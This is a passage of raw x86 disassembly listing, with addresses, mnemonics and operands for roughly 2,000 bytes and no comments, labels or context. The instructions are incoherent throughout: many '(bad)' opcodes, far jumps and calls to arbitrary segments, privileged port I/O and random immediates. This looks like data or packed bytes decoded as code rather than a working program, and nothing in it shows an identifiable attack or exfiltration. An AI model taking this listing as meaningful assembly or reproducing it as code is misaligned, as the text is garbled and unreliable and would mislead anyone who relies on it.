  41890f:	or     ebp,esi
  418911:	jno    0x4188e1
  418913:	mov    esp,0xf103c946
  418918:	xor    cl,BYTE PTR [ebx+0x48]
  41891b:	cli    
  41891c:	xchg   edx,eax
  41891d:	sti    
  41891e:	mov    ds:0x429acbd4,eax
  418923:	add    eax,0xa97b0080
  418928:	mov    ebp,0xc4afdb71
  41892d:	inc    esi
  41892e:	push   0xa39f3978
  418933:	test   al,0x8e
  418935:	push   ebx
  418936:	adc    esi,esp
  418938:	into   
  418939:	dec    ebp
  41893a:	frstor [eax-0x5b]
  41893d:	mov    esp,0xd069b741
  418942:	lods   eax,DWORD PTR ds:[esi]
  418943:	retfw  0xb16f
  418947:	mov    eax,ds:0xe0c64b94
  41894c:	inc    esp
  41894d:	mov    bh,0xcf
  41894f:	or     ecx,DWORD PTR ds:0x81b7f563
  418955:	jecxz  0x41899e
  418957:	mov    ds:0x63a840a,eax
  41895c:	ss push ss
  41895e:	jmp    0xa576923f
  418963:	push   esp
  418964:	add    DWORD PTR [edx],edi
  418966:	jp     0x4188f0
  418968:	cmp    eax,0x31636592
  41896d:	fstp   DWORD PTR [esi+ebx*2]
  418970:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418971:	or     al,0x47
  418973:	test   DWORD PTR [ecx+0xd],edx
  418976:	mov    ebp,0x76ca851f
  41897b:	mov    ah,0xa2
  41897d:	int    0x86
  41897f:	cmp    ch,0xed
  418982:	jmp    0xe18ed31d
  418987:	and    dl,cl
  418989:	imul   ebx,DWORD PTR [ebx],0xfffffff6
  41898c:	test   DWORD PTR [esi],esp
  41898e:	mov    fs,edx
  418990:	jle    0x418997
  418992:	xchg   ebp,eax
  418993:	push   esi
  418994:	sbb    al,BYTE PTR [ebx]
  418996:	mov    ch,0xcd
  418998:	lods   al,BYTE PTR ds:[esi]
  418999:	cmp    esp,eax
  41899b:	out    0x6a,eax
  41899d:	push   esi
  41899e:	rcl    ebp,0xd7
  4189a1:	mov    ds:0x24531b6e,al
  4189a6:	sub    DWORD PTR [esi],ebx
  4189a8:	fwait
  4189a9:	cmp    ebp,esp
  4189ab:	pop    ebx
  4189ac:	pop    ds
  4189ad:	cmp    bh,BYTE PTR [edi+0x6f95c8bb]
  4189b3:	jo     0x418a1a
  4189b5:	fidiv  WORD PTR [eax+0xd]
  4189b8:	imul   esp,edi,0x45
  4189bb:	adc    al,0xd4
  4189bd:	cdq    
  4189be:	fisttp QWORD PTR [eax-0x38]
  4189c1:	test   eax,0xa18a4c2a
  4189c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189c7:	mov    eax,0x4c185b30
  4189cc:	ds mov ecx,0x9bd2125e
  4189d2:	push   es
  4189d3:	and    eax,0xa481af49
  4189d8:	in     al,dx
  4189d9:	test   DWORD PTR [edi-0x54],ebp
  4189dc:	mov    al,ds:0xcd51054b
  4189e1:	sbb    ah,BYTE PTR [eax-0x533f806d]
  4189e7:	mov    bh,0xb4
  4189e9:	retf   
  4189ea:	mov    esi,0x9ca4f083
  4189ef:	call   FWORD PTR [ebx+0x2]
  4189f2:	mov    edx,0xac54959b
  4189f7:	fcom   QWORD PTR [edi]
  4189f9:	dec    ecx
  4189fa:	cmp    al,0x79
  4189fc:	push   0xfffffffc
  4189fe:	imul   esi,DWORD PTR [ecx+ecx*2-0x4b],0x4e3969a0
  418a06:	dec    ebx
  418a07:	arpl   WORD PTR [ebp-0x64],ax
  418a0a:	xchg   ebx,eax
  418a0b:	jnp    0x418a50
  418a0d:	mov    ebp,0xc50598bc
  418a12:	pop    ebp
  418a13:	dec    ecx
  418a14:	repz and BYTE PTR [ebx+edx*2-0x5f],0x37
  418a1a:	cwde   
  418a1b:	int3   
  418a1c:	mov    edx,0x526793b5
  418a21:	add    esp,DWORD PTR [edi-0x1db0e915]
  418a27:	adc    eax,0x8fb78d59
  418a2c:	pop    esp
  418a2d:	cli    
  418a2e:	or     eax,0xdeaedb0c
  418a33:	pop    ds
  418a34:	jle    0x418a2a
  418a36:	call   0xd0ab14b0
  418a3b:	mov    al,0x89
  418a3d:	in     al,dx
  418a3e:	adc    DWORD PTR [edi-0x77731b79],ebx
  418a44:	mov    ebx,0x3d70525a
  418a49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a4a:	push   ss
  418a4b:	xchg   ebx,eax
  418a4c:	push   ss
  418a4d:	addr16 dec edx
  418a4f:	out    0x38,al
  418a51:	cmp    BYTE PTR [edi],dh
  418a53:	out    dx,eax
  418a54:	add    dl,BYTE PTR [edi-0x1d]
  418a57:	or     al,0x60
  418a59:	cmp    al,BYTE PTR [esi-0x17b29700]
  418a5f:	repz adc al,0xfb
  418a62:	cs in  eax,dx
  418a64:	fnstsw WORD PTR [ebx-0x2c]
  418a67:	fild   WORD PTR [ecx]
  418a69:	adc    eax,0x11a63c88
  418a6e:	in     al,dx
  418a6f:	xor    BYTE PTR [esp+edx*2+0x34aa1bba],cl
  418a76:	rcl    BYTE PTR [eax+0x43],cl
  418a79:	mov    ds:0xaf28658f,al
  418a7e:	jmp    0x3be4:0xf799f01d
  418a85:	out    dx,eax
  418a86:	(bad)  
  418a87:	push   ecx
  418a88:	(bad)  
  418a89:	xor    eax,0xc574c24f
  418a8e:	loope  0x418ad6
  418a90:	dec    eax
  418a91:	cmp    cl,cl
  418a93:	fistp  DWORD PTR [eax+0x50af8e52]
  418a99:	sub    eax,0xf2043bf9
  418a9e:	inc    eax
  418a9f:	popf   
  418aa0:	mov    bl,0x73
  418aa2:	mov    al,ds:0xd031b349
  418aa7:	mov    esp,0xa2a5e90
  418aac:	inc    ecx
  418aad:	dec    ecx
  418aae:	stos   DWORD PTR es:[edi],eax
  418aaf:	sar    eax,cl
  418ab1:	in     al,dx
  418ab2:	adc    BYTE PTR [edi],cl
  418ab4:	sub    esi,DWORD PTR [eax]
  418ab6:	or     eax,0x99fca57
  418abb:	adc    ah,bh
  418abd:	shl    BYTE PTR [edi-0x12],cl
  418ac0:	pop    ss
  418ac1:	loopne 0x418a56
  418ac3:	sbb    cl,cl
  418ac5:	push   cs
  418ac6:	and    DWORD PTR [ebx-0x3af92e08],edx
  418acc:	es sbb eax,0x92a3afc3
  418ad2:	retf   
  418ad3:	fadd   st,st(6)
  418ad5:	jecxz  0x418abf
  418ad7:	hlt    
  418ad8:	ja     0x418b02
  418ada:	cli    
  418adb:	add    eax,DWORD PTR [ecx+0x34]
  418ade:	or     eax,0x60451a5b
  418ae3:	jo     0x418a8e
  418ae5:	rcl    ebx,cl
  418ae7:	adc    eax,0x5e2d878e
  418aec:	(bad)  
  418aed:	loope  0x418b6c
  418aef:	std    
  418af0:	ret    0xc7a3
  418af3:	pop    es
  418af4:	repnz sbb DWORD PTR [edi],0x75
  418af8:	fld    QWORD PTR [ebx+eiz*8+0x543b3135]
  418aff:	jnp    0x418abf
  418b01:	mov    cl,0xe1
  418b03:	dec    esp
  418b04:	mov    ebx,0xb57f70b4
  418b09:	addr16 pop ecx
  418b0b:	sbb    eax,0x1cd02a2d
  418b10:	jbe    0x418b38
  418b12:	push   ebx
  418b13:	mov    ebx,0xd313d30c
  418b18:	and    BYTE PTR [esi+0x613a7a2a],ch
  418b1e:	(bad)  
  418b1f:	mov    WORD PTR [eax],es
  418b21:	add    BYTE PTR [eax],al
  418b23:	add    BYTE PTR [eax],al
  418b25:	add    BYTE PTR [ecx-0x2],al
  418b28:	test   BYTE PTR [ebx],ah
  418b2a:	mov    edi,0x51fee77b
  418b2f:	jecxz  0x418b56
  418b31:	arpl   WORD PTR [esi],sp
  418b33:	jp     0x418bb4
  418b35:	xor    cl,BYTE PTR [edi+0x22000185]
  418b3b:	pop    es
  418b3c:	add    BYTE PTR [eax],al
  418b3e:	mov    ebp,0x3119c538
  418b43:	xor    BYTE PTR [ecx+0x6b],al
  418b46:	or     ah,al
  418b48:	mov    ds:0x96be9d68,al
  418b4d:	icebp  
  418b4e:	out    0x85,eax
  418b50:	fsubr  QWORD PTR [bx-0x61]
  418b54:	cmp    al,0xd8
  418b56:	test   al,0xdb
  418b58:	cmc    
  418b59:	mov    al,0xd6
  418b5b:	push   cs
  418b5c:	es scas al,BYTE PTR es:[edi]
  418b5e:	jno    0x418b84
  418b60:	nop
  418b61:	mul    BYTE PTR [esi-0x10842191]
  418b67:	jp     0x418b39
  418b69:	ss jne 0x418b9f
  418b6c:	add    BYTE PTR [ebx+0x2ea75ef5],dl
  418b72:	shl    BYTE PTR [edi],0xfd
  418b75:	fdivr  QWORD PTR fs:[ebx-0x5ef40381]
  418b7c:	jecxz  0x418b90
  418b7e:	and    eax,0x554e3408
  418b83:	stc    
  418b84:	sbb    eax,0xe01c910a
  418b89:	call   0xaf449c36
  418b8e:	iret   
  418b8f:	ds popf 
  418b91:	sbb    bl,BYTE PTR [ecx+0x3f]
  418b94:	mov    bh,0xd4
  418b96:	jo     0x418b67
  418b98:	adc    BYTE PTR [eax-0x23],al
  418b9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b9c:	xchg   esi,eax
  418b9d:	jne    0x418b2e
  418b9f:	fwait
  418ba0:	gs mov ebx,0x4c9b5fe6
  418ba6:	inc    ebx
  418ba7:	popf   
  418ba8:	or     ah,BYTE PTR [ebx-0x6f]
  418bab:	dec    esi
  418bac:	or     eax,0xfd159a75
  418bb1:	xor    eax,0xd4c487c1
  418bb6:	cmp    dl,0xe0
  418bb9:	push   ss
  418bba:	in     eax,0xbe
  418bbc:	push   ds
  418bbd:	(bad)  
  418bbe:	sbb    eax,esp
  418bc0:	lds    ebx,FWORD PTR [esi+0x6d2f9a34]
  418bc6:	call   0x28b8eb26
  418bcb:	inc    ebx
  418bcc:	sub    dl,BYTE PTR [esi]
  418bce:	mov    ds:0x9eb9fc,eax
  418bd3:	adc    DWORD PTR [eax+0x6d],eax
  418bd6:	ins    DWORD PTR es:[edi],dx
  418bd7:	repz xor dh,dl
  418bda:	pop    ds
  418bdb:	inc    ecx
  418bdc:	adc    edx,0xffffffad
  418bdf:	or     bl,BYTE PTR [edi+esi*2-0x80]
  418be3:	test   BYTE PTR [edi+0x124a2775],bl
  418be9:	push   ds
  418bea:	ja     0x418b90
  418bec:	add    eax,0xd2616be6
  418bf1:	jp     0x418c59
  418bf3:	nop
  418bf4:	jl     0x418ba4
  418bf6:	adc    ah,BYTE PTR [edi]
  418bf8:	xchg   ecx,eax
  418bf9:	jge    0x418bba
  418bfb:	push   es
  418bfc:	jle    0x418c4d
  418bfe:	cmp    eax,0x6a1a021a
  418c03:	out    0x65,al
  418c05:	daa    
  418c06:	arpl   sp,cx
  418c08:	(bad)  
  418c09:	jo     0x418b96
  418c0b:	imul   ecx,DWORD PTR [edi],0x7a765ca9
  418c11:	pop    ss
  418c12:	mov    ebp,0x94cbdebc
  418c17:	or     DWORD PTR [edx],esi
  418c19:	das    
  418c1a:	imul   ecx,ebp,0xffffffa8
  418c1d:	fiadd  WORD PTR [edx+0x64]
  418c20:	inc    ebp
  418c21:	pop    edx
  418c22:	loopne 0x418c70
  418c24:	mov    cl,0x2c
  418c26:	imul   edi,eax,0x18d4aa0e
  418c2c:	pop    edi
  418c2d:	xchg   ebx,eax
  418c2e:	cmp    al,bh
  418c30:	test   eax,0x67d135b5
  418c35:	arpl   WORD PTR [esi],dx
  418c37:	cmp    ebp,DWORD PTR [eax+0x5f]
  418c3a:	into   
  418c3b:	mov    ds,WORD PTR [edi+0x41]
  418c3e:	jno    0x418c37
  418c40:	adc    BYTE PTR [eax-0x5b],ah
  418c43:	out    0x1e,eax
  418c45:	xor    esi,eax
  418c47:	(bad)  
  418c48:	xchg   ecx,eax
  418c49:	jmp    0xeeeaba0
  418c4e:	fidiv  WORD PTR [ecx-0x70]
  418c51:	xchg   ebx,eax
  418c52:	lods   al,BYTE PTR ds:[esi]
  418c53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c54:	jb     0x418c9a
  418c56:	mul    BYTE PTR [edi-0x156d1d46]
  418c5c:	pop    eax
  418c5d:	pop    ecx
  418c5e:	jp     0x418cbc
  418c60:	aad    0x9f
  418c62:	push   eax
  418c63:	(bad)  
  418c64:	outs   dx,DWORD PTR ss:[esi]
  418c66:	adc    ebx,eax
  418c68:	mov    BYTE PTR [ebx+0x5b],dl
  418c6b:	and    al,0x76
  418c6d:	jne    0x418c4e
  418c6f:	push   edx
  418c70:	int3   
  418c71:	mov    cl,0x9c
  418c73:	mov    esp,0x107f056b
  418c78:	jne    0x418cc0
  418c7a:	das    
  418c7b:	jecxz  0x418cd3
  418c7d:	aaa    
  418c7e:	fst    DWORD PTR [esi]
  418c80:	jecxz  0x418c47
  418c82:	arpl   WORD PTR [eax],di
  418c84:	pushf  
  418c85:	adc    BYTE PTR [esi],bl
  418c87:	loopne 0x418cb2
  418c89:	push   esp
  418c8a:	fidivr WORD PTR [eax+0x29]
  418c8d:	sub    DWORD PTR [eax+0x671a5604],esi
  418c93:	in     al,0xe7
  418c95:	jmp    0x446:0xe0f73b9c
  418c9c:	adc    eax,0x1eba9769
  418ca1:	stc    
  418ca2:	rcl    DWORD PTR [eax],1
  418ca4:	mov    edi,0xe82befbc
  418ca9:	mov    edi,0xab4a84c
  418cae:	sub    bh,ch
  418cb0:	dec    esi
  418cb1:	fidivr DWORD PTR [ecx+0x6ad97b78]
  418cb7:	imul   ecx,DWORD PTR [ebp+0x8],0x254fd235
  418cbe:	push   cs
  418cbf:	push   ebp
  418cc0:	shl    BYTE PTR [ebp-0x24],1
  418cc3:	or     edx,ebx
  418cc5:	add    ah,0x2c
  418cc8:	jno    0x418ca6
  418cca:	push   ds
  418ccb:	xor    al,bh
  418ccd:	cmc    
  418cce:	xor    ah,BYTE PTR [ebp-0x22]
  418cd1:	idiv   BYTE PTR [edi-0x6c]
  418cd4:	sti    
  418cd5:	cmp    dl,BYTE PTR [ebp+0x50d2e653]
  418cdb:	fild   WORD PTR [edi-0x7f]
  418cde:	mov    bl,BYTE PTR [eax]
  418ce0:	rol    ebx,cl
  418ce2:	(bad)  
  418ce4:	jle    0x418c78
  418ce6:	fstp   DWORD PTR [eax]
  418ce8:	sti    
  418ce9:	and    dl,dl
  418ceb:	adc    edx,DWORD PTR [ecx]
  418ced:	jmp    DWORD PTR [esi+0x66]
  418cf0:	xchg   ebx,eax
  418cf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cf2:	mov    WORD PTR [ebx],?
  418cf4:	out    dx,al
  418cf5:	rol    dl,1
  418cf7:	mov    ds:0x9b956482,al
  418cfc:	js     0x418d41
  418cfe:	shl    BYTE PTR [edx+0x51ba58ee],1
  418d04:	inc    ebp
  418d05:	repnz sub eax,0xd82ab5a4
  418d0b:	inc    ebp
  418d0c:	mov    ch,0xc5
  418d0e:	inc    ecx
  418d0f:	mov    dh,0x5e
  418d11:	test   BYTE PTR [ebp+ebx*1-0x4a],cl
  418d15:	jno    0x418d04
  418d17:	ins    BYTE PTR es:[edi],dx
  418d18:	push   edi
  418d19:	jmp    0xc20e:0x2fe06013
  418d20:	ficomp WORD PTR [ebx+0x25]
  418d23:	xchg   ebp,eax
  418d24:	cmp    al,0x96
  418d26:	mov    WORD PTR [ecx],ss
  418d28:	mov    bl,0x8
  418d2a:	pop    edx
  418d2b:	fcom   DWORD PTR [edx]
  418d2d:	lea    edi,[edx-0x1a]
  418d30:	shl    BYTE PTR [eax],0x7f
  418d33:	or     ebx,DWORD PTR [edx-0x4c]
  418d36:	(bad)  
  418d37:	push   esi
  418d38:	push   cs
  418d39:	jno    0x418d65
  418d3b:	push   edi
  418d3c:	jnp    0x418cd1
  418d3e:	pop    ss
  418d3f:	(bad)  
  418d40:	cdq    
  418d41:	ficomp DWORD PTR [edx]
  418d43:	test   DWORD PTR [edi-0x1c],eax
  418d46:	cmc    
  418d47:	mov    ch,0x77
  418d49:	int    0x9
  418d4b:	in     al,0xa5
  418d4d:	std    
  418d4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d4f:	sub    eax,0x4e9f519c
  418d54:	jmp    0x76ba:0x50a65e28
  418d5b:	sub    al,BYTE PTR [esi]
  418d5d:	mov    DWORD PTR [ecx+0x2f9a17d6],esp
  418d63:	xchg   esi,eax
  418d64:	or     al,0x2f
  418d66:	idiv   BYTE PTR [edi+0x26611d3e]
  418d6c:	jae    0x418d57
  418d6e:	add    BYTE PTR [ecx+0x60],ch
  418d71:	pop    esp
  418d72:	xor    BYTE PTR [edi],dl
  418d74:	mov    esi,0xc9b7215c
  418d79:	push   esi
  418d7a:	scas   al,BYTE PTR es:[edi]
  418d7b:	push   cs
  418d7c:	ret    0x55bd
  418d7f:	cmp    eax,0x5c9c9b3f
  418d84:	inc    ebp
  418d85:	dec    esi
  418d86:	and    eax,0xdc882ff2
  418d8b:	xor    DWORD PTR [ebx],ecx
  418d8d:	arpl   WORD PTR [ebp-0x52],ax
  418d90:	lods   al,BYTE PTR ds:[esi]
  418d91:	sub    eax,0x9842a835
  418d96:	cs xchg cl,ah
  418d99:	fiadd  WORD PTR [esi]
  418d9b:	mov    esp,0xe7e10952
  418da0:	and    BYTE PTR [ebp-0x41],0xb9
  418da4:	and    eax,0xaeca52eb
  418da9:	jne    0x418df3
  418dab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dac:	fsubr  st(0),st
  418daf:	jno    0x418d85
  418db1:	mov    ecx,0x81136048
  418db6:	mov    edx,0xd3696ebb
  418dbb:	(bad)  [esi+esi*2]
  418dbe:	pop    esi
  418dbf:	shl    DWORD PTR [ebp+0xe49b546],1
  418dc5:	enter  0x5254,0x47
  418dc9:	and    eax,0x49c2d672
  418dcf:	dec    esi
  418dd0:	test   al,0xea
  418dd2:	cli    
  418dd3:	in     eax,dx
  418dd4:	out    dx,al
  418dd5:	test   eax,0x608dc7eb
  418dda:	dec    esi
  418ddb:	out    dx,al
  418ddc:	fild   WORD PTR [edi-0x33adf68d]
  418de2:	ret    
  418de3:	and    BYTE PTR [edi],ah
  418de5:	mov    eax,0xebea9edc
  418dea:	es popa 
  418dec:	jne    0x418d9b
  418dee:	ss neg eax
  418df1:	jbe    0x418e40
  418df3:	xchg   edi,eax
  418df4:	or     edx,DWORD PTR es:0x52e569ef
  418dfb:	or     DWORD PTR [ecx],esp
  418dfd:	push   0x315cfb1
  418e02:	add    ebp,DWORD PTR [ebp-0x290de76d]
  418e08:	and    edx,ebp
  418e0a:	push   esi
  418e0b:	cs retf 0x7ad8
  418e0f:	fidiv  WORD PTR [ebx+0x43a8dd89]
  418e15:	dec    esp
  418e16:	out    dx,eax
  418e17:	(bad)  
  418e19:	sbb    esi,DWORD PTR [ebp+0x3c5904c6]
  418e1f:	jge    0x418db4
  418e21:	inc    ecx
  418e22:	sti    
  418e23:	sub    esp,esi
  418e25:	aas    
  418e26:	rol    DWORD PTR [ecx],cl
  418e28:	xor    al,0x9e
  418e2a:	push   ebp
  418e2b:	dec    edx
  418e2c:	arpl   WORD PTR [edx],ax
  418e2e:	pop    ebx
  418e2f:	sbb    al,0xfc
  418e31:	jns    0x418dbb
  418e33:	ror    BYTE PTR fs:[ebx],1
  418e36:	inc    esi
  418e37:	ret    
  418e38:	bnd jmp 0x418e77
  418e3b:	inc    eax
  418e3c:	dec    edi
  418e3d:	leave  
  418e3e:	xchg   ecx,eax
  418e3f:	pop    ebx
  418e40:	or     DWORD PTR [ecx],0xffffff8f
  418e43:	fld    DWORD PTR [ecx]
  418e45:	add    dh,BYTE PTR [ecx-0x4a]
  418e48:	xor    al,BYTE PTR [eax+0x38]
  418e4b:	loop   0x418df5
  418e4d:	sub    eax,0xd2f074f3
  418e52:	dec    esi
  418e53:	or     eax,0x84772d6d
  418e58:	sti    
  418e59:	xchg   esi,eax
  418e5a:	or     DWORD PTR [ebp+0x2c5068d4],eax
  418e60:	add    DWORD PTR [ecx-0x4c],0xffffffa9
  418e64:	xor    ebx,DWORD PTR [eax]
  418e66:	jo     0x418e31
  418e68:	and    DWORD PTR [edi+0x20],ebp
  418e6b:	jmp    0x4b3:0x3a1dd7b5
  418e72:	lds    ebp,FWORD PTR [eax+0x4ef0b197]
  418e78:	jmp    0xc589:0x7a5c3aec
  418e7f:	and    DWORD PTR [esi+0x30],ebp
  418e82:	add    edx,DWORD PTR [ebx]
  418e84:	fcmovnb st,st(6)
  418e86:	sub    eax,0x257c31fb
  418e8b:	ret    0x2eaf
  418e8e:	rcl    BYTE PTR [eax+0x4ed8a9f6],cl
  418e94:	mov    esi,0x6eba28bb
  418e99:	or     eax,0x354a512a
  418e9e:	push   esi
  418e9f:	dec    ebp
  418ea0:	test   BYTE PTR [ecx+0x248b26c3],bh
  418ea6:	inc    edx
  418ea7:	in     eax,0x9d
  418ea9:	fst    DWORD PTR [ebx]
  418eab:	xchg   DWORD PTR [edx],edx
  418ead:	pop    esp
  418eae:	iret   
  418eaf:	nop
  418eb0:	(bad)  
  418eb1:	fst    DWORD PTR [eax-0x71]
  418eb4:	imul   ecx,DWORD PTR [edx-0x4944bf9c],0x6f
  418ebb:	push   ds
  418ebc:	lods   eax,DWORD PTR ds:[esi]
  418ebd:	ja     0x418f0c
  418ebf:	rol    DWORD PTR [ebx+edi*8],1
  418ec2:	cmp    al,0xa9
  418ec4:	jle    0x418e9d
  418ec6:	cmp    ebp,DWORD PTR [ecx+eiz*2-0x6e]
  418eca:	(bad)  
  418ecb:	push   ds
  418ecc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ecd:	loopne 0x418edc
  418ecf:	ret    
  418ed0:	dec    eax
  418ed1:	arpl   WORD PTR [ebx-0x3e],dx
  418ed4:	std    
  418ed5:	out    dx,al
  418ed6:	xlat   BYTE PTR ds:[ebx]
  418ed7:	idiv   DWORD PTR [ebx+0x26]
  418eda:	xor    ch,BYTE PTR [ecx-0x54]
  418edd:	idiv   DWORD PTR [edx+0x22ca8878]
  418ee3:	push   edx
  418ee4:	fadd   st(1),st
  418ee6:	mov    bh,0x73
  418ee8:	shr    BYTE PTR [ecx],1
  418eea:	js     0x418ef6
  418eec:	mov    edx,0xde45b8b2
  418ef1:	iret   
  418ef2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ef3:	xchg   ecx,eax
  418ef4:	adc    eax,0xe1624a0f
  418ef9:	or     BYTE PTR [esi-0x50eebc56],0x6c
  418f00:	(bad)  
  418f01:	in     eax,0xc4
  418f03:	dec    edi
  418f04:	test   esp,ebp
  418f06:	xor    BYTE PTR [esi+0x41],al
  418f09:	out    dx,eax
  418f0a:	outs   dx,BYTE PTR ds:[esi]
  418f0b:	dec    ebx
  418f0c:	aam    0x7d
  418f0e:	fwait
  418f0f:	dec    ebp
  418f10:	jecxz  0x418edd
  418f12:	nop
  418f13:	stos   BYTE PTR es:[edi],al
  418f14:	fbld   TBYTE PTR [esi+eax*2]
  418f17:	jl     0x418f16
  418f19:	and    dh,BYTE PTR [ecx]
  418f1b:	jo     0x418f20
  418f1d:	jmp    0xf964:0x75695487
  418f24:	test   BYTE PTR [esi],0xa
  418f27:	aaa    
  418f28:	sbb    BYTE PTR [edi],bh
  418f2a:	dec    ebx
  418f2b:	sub    edi,esi
  418f2d:	dec    ecx
  418f2e:	xor    DWORD PTR [ebx-0x182a6a31],esp
  418f34:	add    DWORD PTR ds:[esi],edi
  418f37:	xchg   ebx,eax
  418f38:	outs   dx,BYTE PTR ds:[esi]
  418f39:	pop    ecx
  418f3a:	adc    DWORD PTR [edx-0x34801f6f],0x2caae890
  418f44:	push   eax
  418f45:	scas   al,BYTE PTR es:[edi]
  418f46:	sbb    al,0xcb
  418f48:	pop    es
  418f49:	add    al,0xa4
  418f4b:	test   al,0x6a
  418f4d:	push   esp
  418f4e:	push   cs
  418f4f:	test   BYTE PTR [esi+esi*1-0x491c72bf],0xae
  418f57:	in     eax,dx
  418f58:	dec    eax
  418f59:	mov    ds:0x20ed2316,al
  418f5e:	cmp    ebp,esp
  418f60:	add    eax,0x63ea020b
  418f65:	add    ebx,DWORD PTR [esi]
  418f67:	push   esp
  418f68:	adc    DWORD PTR [ecx+0x63],0x220aea79
  418f6f:	inc    esp
  418f70:	xchg   ecx,eax
  418f71:	sub    eax,0x9e4a4fb
  418f76:	fs or  al,0x1b
  418f79:	xchg   BYTE PTR [eax],cl
  418f7b:	jle    0x418f67
  418f7d:	imul   dh
  418f7f:	mov    ebx,0xe5b7051e
  418f84:	adc    bl,bl
  418f86:	xchg   edi,eax
  418f87:	jo     0x418fe3
  418f89:	test   bl,ah
  418f8b:	aaa    
  418f8c:	cli    
  418f8d:	stos   DWORD PTR es:[edi],eax
  418f8e:	dec    edi
  418f8f:	fstp   TBYTE PTR [esi]
  418f91:	push   edi
  418f92:	fsub   QWORD PTR [ebx]
  418f94:	fsub   DWORD PTR [ecx]
  418f96:	mov    edx,0x26dc791c
  418f9b:	xor    DWORD PTR [eax],0x37
  418f9e:	push   ebp
  418f9f:	sbb    BYTE PTR [ebp-0x5a3880d7],ch
  418fa5:	call   0x8fcc:0x4b2ee076
  418fac:	outs   dx,DWORD PTR ss:[esi]
  418fae:	xchg   ebx,eax
  418faf:	fcmove st,st(3)
  418fb1:	sub    DWORD PTR [edi+ebx*1],edx
  418fb4:	pop    esi
  418fb5:	push   0x5f
  418fb7:	nop
  418fb8:	pusha  
  418fb9:	les    esp,FWORD PTR [esi+0x3b]
  418fbc:	fiadd  WORD PTR [edx+0x456d25f9]
  418fc2:	or     ah,BYTE PTR [eax+0x50cc46d3]
  418fc8:	daa    
  418fc9:	mov    al,0x8a
  418fcb:	push   ds
  418fcc:	mov    edx,0x4f56f18
  418fd1:	or     ch,BYTE PTR [eax-0x2c]
  418fd4:	iret   
  418fd5:	in     al,dx
  418fd6:	pop    ecx
  418fd7:	push   cs
  418fd8:	mov    esi,0x5b8e6e43
  418fdd:	jmp    0x418fa1
  418fdf:	ja     0x418fbf
  418fe1:	sub    DWORD PTR [ebx-0x1e],eax
  418fe4:	add    BYTE PTR [ecx+eax*2],ah
  418fe7:	cmc    
  418fe8:	and    DWORD PTR [ebx],0x70a7267e
  418fee:	leave  
  418fef:	out    dx,eax
  418ff0:	jle    0x418f97
  418ff2:	xchg   DWORD PTR [ebp+0x10],eax
  418ff5:	arpl   WORD PTR [eax],si
  418ff7:	leave  
  418ff8:	cmp    eax,0xc8791b65
  418ffd:	jl     0x419009
  418fff:	mov    BYTE PTR [esi],dh
  419001:	add    BYTE PTR [esi+0x78],cl
  419004:	sbb    eax,DWORD PTR [ebp-0x694ca15c]
  41900a:	mov    ds:0xd8ac89a9,eax
  41900f:	xchg   ecx,eax
  419010:	outs   dx,DWORD PTR ds:[esi]
  419011:	mov    ebp,0x647ec086
  419016:	mov    edi,esi
  419018:	js     0x418fe8
  41901a:	iret   
  41901b:	fcomip st,st(0)
  41901d:	xlat   BYTE PTR ds:[ebx]
  41901e:	ja     0x418fbc
  419020:	mov    al,0x43
  419022:	add    eax,0x4d5151e4
  419027:	mov    BYTE PTR [ebp+0x148e3b19],cl
  41902d:	mov    WORD PTR [edx-0x3ff57815],ds
  419033:	push   esi
  419034:	pushf  
  419035:	xchg   edi,eax
  419036:	mov    BYTE PTR [edx],ch
  419038:	push   eax
  419039:	mov    DWORD PTR [edi+0x65],esp
  41903c:	call   0x185c:0xf18bf424
  419043:	gs mov bl,0xb8
  419046:	cmp    ebp,DWORD PTR [edi-0xa]
  419049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41904a:	retf   0x63
  41904d:	retf   0x3cb7
  419050:	aas    
  419051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419052:	sar    DWORD PTR [edi-0x6846568a],0x16
  419059:	sub    eax,0x4805badd
  41905e:	adc    al,0xeb
  419060:	int3   
  419061:	out    0xe8,eax
  419063:	arpl   WORD PTR [eax-0x1a],bp
  419066:	mov    al,0xfd
  419068:	inc    ebx
  419069:	push   cs
  41906a:	adc    BYTE PTR [edx-0x57],dh
  41906d:	pop    es
  41906e:	ins    DWORD PTR es:[edi],dx
  41906f:	leave  
  419070:	shl    dl,cl
  419072:	sbb    DWORD PTR [edi-0x1b],ebp
  419075:	mov    edi,?
  419077:	sbb    BYTE PTR [eax],dh
  419079:	sub    BYTE PTR [esi+0x1ea1ac77],0xcb
  419080:	xor    BYTE PTR [ebx+0x551a6e5d],ah
  419086:	bound  ebx,QWORD PTR [ecx+ebx*2]
  419089:	test   BYTE PTR [esi-0x9bda156],ah
  41908f:	push   ds
  419090:	pop    es
  419091:	sbb    cl,BYTE PTR [edi]
  419093:	sub    BYTE PTR [eax-0x27b49052],al
  419099:	(bad)  
  41909a:	idiv   BYTE PTR [edi-0x51]
  41909d:	ins    BYTE PTR es:[edi],dx
  41909e:	int3   
  41909f:	stos   DWORD PTR es:[edi],eax
  4190a0:	mov    edi,0xcec07804
  4190a5:	push   ebx
  4190a6:	lds    eax,FWORD PTR [ebx+0x73]
  4190a9:	mov    cl,BYTE PTR [ecx+0x38]
  4190ac:	pushf  
  4190ad:	xchg   esp,ecx
  4190af:	dec    esi
  4190b0:	clc    
  4190b1:	(bad)
  4190b5:	or     cl,BYTE PTR [ebp-0x61]
  4190b8:	dec    ebx
  4190b9:	or     BYTE PTR [edi+0xa37e985],ch
  4190bf:	fsub   QWORD PTR [edi-0x5f5126d6]
  4190c5:	repnz cmc 
  4190c7:	scas   eax,DWORD PTR es:[edi]
  4190c8:	jp     0x4190ef
  4190ca:	pusha  
  4190cb:	fidiv  WORD PTR [eax-0x2e53575f]
  4190d1:	loop   0x419092
  4190d3:	mov    ?,WORD PTR [edi]
  4190d5:	in     eax,0xc5
  4190d7:	dec    ecx
  4190d8:	fmul   QWORD PTR [edi]
